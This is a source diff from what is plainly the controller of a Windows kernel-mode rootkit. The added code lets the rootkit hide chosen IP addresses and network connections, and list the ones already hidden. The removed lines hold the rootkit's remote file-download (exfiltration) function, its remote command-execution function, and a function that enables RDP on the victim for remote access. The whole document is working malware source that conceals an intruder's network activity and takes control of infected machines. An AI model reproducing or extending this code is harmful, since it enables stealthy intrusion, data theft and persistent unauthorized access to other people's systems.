@@ -629,55 +629,63 @@ BOOL DriverCalls::HideProcessRootkKMD(char ModuleName[], BOOL IS_DKOM, int Proce
 }
 
 
-BOOL DriverCalls::HidePortConnectionRootkKMD(char ModuleName[], USHORT PortNumber, USHORT RemoveIndex, SOCKET CommSocket, NTSTATUS RequestStatus) {
+BOOL DriverCalls::HideNetworkingRootkKMD(char ModuleName[], char* IpAddress, USHORT RemoveIndex, SOCKET CommSocket, NTSTATUS RequestStatus) {
 	ROOTKIT_MEMORY RootkInstructions = { 0 };
+	ULONG AddressValue = 0;
+	ULONG CurrentHiddenValue = 0;
 	PASS_DATA SocketResult = { 0 };
-	PVOID HiddenPorts = NULL;
-	USHORT CurrentHiddenPort = 0;
+	PVOID HiddenIpAddresses = NULL;
+	char CurrentHiddenAddress[MAX_PATH] = { 0 };
 	int CurrentIndex = 0;
 	BOOL OperationResult = FALSE;
 
-	printf("=====HidePort=====\n\n");
-	RootkInstructions.Operation = RKOP_HIDEPROC;
+	printf("=====HideNetworking=====\n\n");
+	RootkInstructions.Operation = RKOP_HIDEADDR;
 
 
 	// Pass initial string:
 	if (!PassString(CommSocket, ModuleName)) {
 		printf("LOG: Could not pass allocation module name (%s) to medium :(\n", ModuleName);
-		printf("=====================\n\n");
+		printf("========================\n\n");
 		return FALSE;
 	}
 
 
-	// Pass status of type of port manipulation:
+	// Pass status of type of network communication manipulation:
 	SocketResult = SendData(CommSocket, &RequestStatus, sizeof(NTSTATUS), FALSE, 0);
 	if (SocketResult.err || SocketResult.value != sizeof(NTSTATUS)) {
-		printf("LOG: Could not perform manipulations of ports (passing/receiving errors) :(\n");
-		printf("=====================\n\n");
+		printf("LOG: Could not perform manipulations of network communication (passing/receiving errors) :(\n");
+		printf("========================\n\n");
 		return FALSE;
 	}
 
 
 	// Pass preprocessing parameters (if needed) and set struct values:
+	AddressValue = GeneralUtils::CalculateAddressValue(IpAddress);
+	if (AddressValue == 0) {
+		printf("LOG: Could not perform manipulations of network communication (cannot calculate address value) :(\n");
+		printf("========================\n\n");
+		return FALSE;
+	}
 	switch (RequestStatus) {
-	case HIDE_PROCESS:
-		RootkInstructions.Buffer = (PVOID)PortNumber;
+	case HIDE_ADDR:
+		RootkInstructions.Buffer = (PVOID)AddressValue;
 		RootkInstructions.Reserved = 0;
-		RootkInstructions.Size = HidePort;
+		RootkInstructions.Size = HideAddress;
 		break;
-	case UNHIDE_PROCESS:
+	case UNHIDE_ADDR:
 		if (RemoveIndex != -1) {
-			RootkInstructions.Buffer = (PVOID)REMOVE_BY_INDEX_PORT;
+			RootkInstructions.Buffer = (PVOID)REMOVE_BY_INDEX_ADDR;
 			RootkInstructions.Reserved = (PVOID)RemoveIndex;
 		}
 		else {
-			RootkInstructions.Buffer = (PVOID)PortNumber;
+			RootkInstructions.Buffer = (PVOID)AddressValue;
 			RootkInstructions.Reserved = 0;
 		}
-		RootkInstructions.Size = UnhidePort;
+		RootkInstructions.Size = UnhideAddress;
 		break;
 	default:
-		RootkInstructions.Size = ListHiddenPorts;
+		RootkInstructions.Size = ListHiddenAddresses;
 		break;
 	}
 
@@ -685,8 +693,8 @@ BOOL DriverCalls::HidePortConnectionRootkKMD(char ModuleName[], USHORT PortNumbe
 	// Pass all of the arguments of the operation to the medium:
 	OperationResult = PassArgs(&RootkInstructions, CommSocket, TRUE);
 	if (!OperationResult) {
-		printf("LOG: Could not perform manipulations of ports (passing/receiving errors) :(\n");
-		printf("=====================\n\n");
+		printf("LOG: Could not perform manipulations of network communication (passing/receiving errors) :(\n");
+		printf("========================\n\n");
 		return FALSE;
 	}
 
@@ -695,237 +703,48 @@ BOOL DriverCalls::HidePortConnectionRootkKMD(char ModuleName[], USHORT PortNumbe
 	PrintStatusCode(RootkInstructions.StatusCode);
 	PrintUnexpected(RootkInstructions.Unexpected);
 	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL) {
-		printf("RESPONSE: Could not perform manipulations of ports - did not succeed :(\n");
-		printf("=====================\n\n");
+		printf("RESPONSE: Could not perform manipulations of network communication - did not succeed :(\n");
+		printf("========================\n\n");
 		return FALSE;
 	}
 
 
 	// Parse output for specific requests:
-	if (RequestStatus == SHOWHIDDEN_PORTS) {
+	if (RequestStatus == SHOWHIDDEN_ADDRS) {
 		if (RootkInstructions.Size == 0) {
-			printf("RESPONSE: Could not perform manipulations of ports - listing request returned list with size of 0 bytes :(\n");
-			printf("=====================\n\n");
+			printf("RESPONSE: Could not perform manipulations of network communication - listing request returned list with size of 0 bytes :(\n");
+			printf("========================\n\n");
 			return FALSE;
 		}
-		HiddenPorts = malloc(RootkInstructions.Size);
-		if (HiddenPorts == NULL) {
-			printf("RESPONSE: Could not perform manipulations of ports - could not allocate memory for list :(\n");
-			printf("\n===========================\n");
+		HiddenIpAddresses = malloc(RootkInstructions.Size);
+		if (HiddenIpAddresses == NULL) {
+			printf("RESPONSE: Could not perform manipulations of network communication - could not allocate memory for list :(\n");
+			printf("========================\n\n");
 			return FALSE;
 		}
-		SocketResult = RecvData(CommSocket, RootkInstructions.Size, HiddenPorts, FALSE, 0);
+		SocketResult = RecvData(CommSocket, RootkInstructions.Size, HiddenIpAddresses, FALSE, 0);
 		if (SocketResult.err || SocketResult.value != RootkInstructions.Size) {
 			printf("Error in system info might have been because medium could not receive the size of the buffer\n");
-			printf("\n===========================\n");
-			free(HiddenPorts);
+			printf("========================\n\n");
+			free(HiddenIpAddresses);
 			return FALSE;
 		}
-		printf("Currently hidden ports (dynamically):\n");
-		RtlCopyMemory(&CurrentHiddenPort, (PVOID)((ULONG64)HiddenPorts + (CurrentIndex * sizeof(USHORT))), sizeof(USHORT));
-		while (CurrentHiddenPort != 65535) {
-			printf("Port at index %d - %hu\n", CurrentIndex, CurrentHiddenPort);
+		printf("Currently hidden IP addresses (dynamically):\n");
+		RtlCopyMemory(&CurrentHiddenValue, (PVOID)((ULONG64)HiddenIpAddresses + (CurrentIndex * sizeof(ULONG))), sizeof(ULONG));
+		while (CurrentHiddenValue != 0xFFFFFFFF) {
+			if (GeneralUtils::CalculateAddressString(CurrentHiddenAddress,
+				CurrentHiddenValue)) {
+				printf("Address at index %d - %s\n", CurrentIndex, CurrentHiddenAddress);
+			}
+			else {
+				printf("Address at index %d - 0x%X, unresolved\n", CurrentIndex, CurrentHiddenValue);
+			}
 			CurrentIndex++;
-			RtlCopyMemory(&CurrentHiddenPort, (PVOID)((ULONG64)HiddenPorts + (CurrentIndex * sizeof(USHORT))), sizeof(USHORT));
+			RtlCopyMemory(&CurrentHiddenValue, (PVOID)((ULONG64)HiddenIpAddresses + (CurrentIndex * sizeof(ULONG))), sizeof(ULONG));
 		}
 	}
-	printf("RESPONSE: Manipulations of ports succeeded :)\n");
-	printf("\n===========================\n");
-	free(HiddenPorts);
-	return TRUE;
-}
-
-
-BOOL GeneralRequests::DownloadFileRequest(char* FilePath, SOCKET ClientToServerSocket) {
-	ROOTKIT_MEMORY RootkInstructions = { 0 };
-	PASS_DATA SocketResult = { 0 };
-	PVOID FileData = NULL;
-	char LocalPath[MAX_PATH] = { 0 };
-	BOOL OperationResult = FALSE;
-	HANDLE LocalHandle = INVALID_HANDLE_VALUE;
-	DWORD BytesWritten = 0;
-
-	printf("=====DownloadFile=====\n\n");
-	RootkInstructions.Operation = RKOP_GETFILE;
-
-
-	// Pass initial string:
-	if (!PassString(ClientToServerSocket, FilePath)) {
-		printf("LOG: Could not pass file path (%s) to medium :(\n", FilePath);
-		printf("======================\n\n");
-		return FALSE;
-	}
-
-
-	// Pass all of the arguments of the operation to the medium:
-	OperationResult = PassArgs(&RootkInstructions, ClientToServerSocket, TRUE);
-	if (!OperationResult) {
-		printf("LOG: Could not get file (passing/receiving errors) :(\n");
-		printf("======================\n\n");
-		return FALSE;
-	}
-
-
-	// Get the buffer with the file data if operation succeeded:
-	PrintStatusCode(RootkInstructions.StatusCode);
-	PrintUnexpected(RootkInstructions.Unexpected);
-	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL || RootkInstructions.Size == 0) {
-		printf("RESPONSE: Could not get file - did not succeed :(\n");
-		printf("======================\n\n");
-		return FALSE;
-	}
-	FileData = malloc(RootkInstructions.Size);
-	if (FileData == NULL){
-		printf("Could not get buffer with file data :(\n");
-		printf("======================\n\n");
-		return FALSE;
-	}
-	SocketResult = RecvData(ClientToServerSocket, RootkInstructions.Size, FileData, FALSE, 0);
-	if (SocketResult.err || SocketResult.value != RootkInstructions.Size) {
-		printf("Could not get buffer with file data :(\n");
-		printf("======================\n\n");
-		return FALSE;
-	}
-
-
-	// Store file data in local file:
-	printf("Write path to store file in (match the extensions):\n");
-	scanf_s("%s", LocalPath);
-	LocalHandle = CreateFileA(LocalPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL,
-		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (LocalHandle == INVALID_HANDLE_VALUE) {
-		printf("Could not handle for local file :(\n");
-		printf("======================\n\n");
-		return FALSE;
-	}
-	if (!WriteFile(LocalHandle, FileData, RootkInstructions.Size, &BytesWritten, NULL) ||
-		BytesWritten != RootkInstructions.Size) {
-		CloseHandle(LocalHandle);
-		printf("Could not write to local file :(\n");
-		printf("======================\n\n");
-		return FALSE;
-	}
-	printf("Created local file at %s\n", LocalPath);
-	printf("======================\n\n");
-	CloseHandle(LocalHandle);
-	return TRUE;
-}
-
-BOOL GeneralRequests::RemoteCommandRequest(char* NakedCommand, SOCKET ClientToServerSocket) {
-	ROOTKIT_MEMORY RootkInstructions = { 0 };
-	PASS_DATA SocketResult = { 0 };
-	PVOID CommandResult = NULL;
-	char LocalPath[MAX_PATH] = { 0 };
-	BOOL OperationResult = FALSE;
-	HANDLE LocalHandle = INVALID_HANDLE_VALUE;
-	DWORD BytesWritten = 0;
-
-	printf("=====RemoteCommand=====\n\n");
-	RootkInstructions.Operation = RKOP_EXECOMMAND;
-
-
-	// Pass initial string:
-	if (!PassString(ClientToServerSocket, NakedCommand)) {
-		printf("LOG: Could not pass naked command (%s) to medium :(\n", NakedCommand);
-		printf("=======================\n\n");
-		return FALSE;
-	}
-
-
-	// Pass all of the arguments of the operation to the medium:
-	OperationResult = PassArgs(&RootkInstructions, ClientToServerSocket, TRUE);
-	if (!OperationResult) {
-		printf("LOG: Could not perform CMD command (passing/receiving errors) :(\n");
-		printf("=======================\n\n");
-		return FALSE;
-	}
-
-
-	// Get the buffer with the command result if operation succeeded:
-	PrintStatusCode(RootkInstructions.StatusCode);
-	PrintUnexpected(RootkInstructions.Unexpected);
-	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL || RootkInstructions.Size == 0) {
-		printf("RESPONSE: Could not execute command - did not succeed :(\n");
-		printf("=======================\n\n");
-		return FALSE;
-	}
-	CommandResult = malloc(RootkInstructions.Size);
-	if (CommandResult == NULL) {
-		printf("Could not get buffer with command result :(\n");
-		printf("=======================\n\n");
-		return FALSE;
-	}
-	SocketResult = RecvData(ClientToServerSocket, RootkInstructions.Size, CommandResult, FALSE, 0);
-	if (SocketResult.err || SocketResult.value != RootkInstructions.Size) {
-		printf("Could not get buffer with command result :(\n");
-		printf("=======================\n\n");
-		return FALSE;
-	}
-
-
-	// Store command result in local file:
-	printf("Write path to store command result in:\n");
-	scanf_s("%s", LocalPath);
-	LocalHandle = CreateFileA(LocalPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL,
-		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (LocalHandle == INVALID_HANDLE_VALUE) {
-		printf("Could not handle for local file of command result :(\n");
-		printf("=======================\n\n");
-		return FALSE;
-	}
-	BytesWritten = 0;
-	if (!WriteFile(LocalHandle, CommandResult, RootkInstructions.Size, &BytesWritten, NULL) ||
-		BytesWritten != RootkInstructions.Size) {
-		CloseHandle(LocalHandle);
-		printf("Could not write to local file of command result :(\n");
-		printf("=======================\n\n");
-		return FALSE;
-	}
-	printf("Created local file with command result at %s\n", LocalPath);
-	printf("=======================\n\n");
-	CloseHandle(LocalHandle);
-	return TRUE;
-}
-
-
-BOOL GeneralRequests::ActivateRDPRequest(SOCKET ClientToServerSocket, char* DummyString) {
-	ROOTKIT_MEMORY RootkInstructions = { 0 };
-	BOOL OperationResult = FALSE;
-
-	printf("=====ActivateRDPRequest=====\n\n");
-	RootkInstructions.Operation = RKOP_ACTIVATERDP;
-
-
-	// Pass initial string:
-	if (!PassString(ClientToServerSocket, DummyString)) {
-		printf("LOG: Could not pass dummy string (%s) to medium :(\n", DummyString);
-		printf("============================\n\n");
-		return FALSE;
-	}
-
-
-	// Pass all of the arguments of the operation to the medium:
-	OperationResult = PassArgs(&RootkInstructions, ClientToServerSocket, TRUE);
-	if (!OperationResult) {
-		printf("LOG: Could not activate RDP (passing/receiving errors) :(\n");
-		printf("============================\n\n");
-		return FALSE;
-	}
-
-
-	// Check if activating RDP has succeeded:
-	PrintStatusCode(RootkInstructions.StatusCode);
-	PrintUnexpected(RootkInstructions.Unexpected);
-	if (RootkInstructions.Status == STATUS_UNSUCCESSFUL || RootkInstructions.Size == 0) {
-		printf("RESPONSE: Could not activate RDP - did not succeed :(\n");
-		printf("============================\n\n");
-		return FALSE;
-	}
-	printf("Activated RDP, to connect to server:\n"
-		   "1) If mRemoteNG is not installed download it from https://mremoteng.org/download\n"
-		   "2) Select RDP as the remote protocol and write the target IP address from the download server\n"
-		   "3) Press the green arrow next to the protocol specifier to open the connection\n"
-		   "4) Press the X button on the connection window to stop the connection\n");
-	printf("============================\n\n");
+	printf("RESPONSE: Manipulations of network communication succeeded :)\n");
+	printf("\n========================\n");
+	free(HiddenIpAddresses);
 	return TRUE;
 }
